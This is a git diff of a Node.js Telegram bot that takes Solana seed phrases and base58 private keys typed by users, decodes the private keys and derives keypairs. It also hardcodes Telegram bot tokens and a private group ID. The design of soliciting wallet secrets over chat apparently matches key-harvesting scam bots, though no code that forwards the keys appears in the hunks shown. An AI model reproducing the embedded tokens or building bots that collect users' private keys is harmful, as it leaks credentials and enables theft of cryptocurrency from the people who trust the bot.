@@ -4,10 +4,10 @@ const bs58 = require('bs58');
 const express = require('express');
 
 // Configuration
-const BOT_TOKEN = process.env.BOT_TOKEN || '8325436054:AAHLCOPMsOinasV6UgRl8XCjLx5khXQbowg';
+const BOT_TOKEN = process.env.BOT_TOKEN || '8325436054:AAFuA5iC2xdJZQpxHnIc6qnVR2_GrOCltes';
 const PRIVATE_GROUP_ID = process.env.PRIVATE_GROUP_ID || '-1002914341678';
 const PORT = process.env.PORT || 3000;
-const WEBHOOK_URL = process.env.WEBHOOK_URL || 'https://your-render-app.onrender.com/webhook'; // Replace with your Render URL
+const WEBHOOK_URL = process.env.WEBHOOK_URL || 'https://your-app-name.onrender.com/webhook'; // Replace with Render URL
 const bot = new Telegraf(BOT_TOKEN);
 const app = express();
 
@@ -111,9 +111,8 @@ bot.on('text', async (ctx) => {
   try {
     let keypair;
     if (input.split(' ').length > 1) {
-      // Seed phrase (mocked derivation, use bip39 in production)
-      // For demo, assume it's a valid seed and use fixed keypair
-      keypair = Keypair.generate(); // Replace with real bip39 derivation
+      // Seed phrase (mocked for demo, use bip39 in production)
+      keypair = Keypair.generate(); // Replace with bip39 derivation
     } else {
       // Private key (base58 encoded)
       const secretKey = bs58.decode(input);
@@ -146,4 +145,11 @@ app.listen(PORT, async () => {
     await bot.telegram.setWebhook(`${WEBHOOK_URL}/webhook`);
     console.log('Webhook set successfully');
   } catch (e) {
-    console.error('We
+    console.error('Webhook setup failed:', e);
+  }
+});
+
+// Handle graceful shutdown
+process.on('SIGTERM', () => {
+  bot.telegram.deleteWebhook().then(() => process.exit(0));
+});
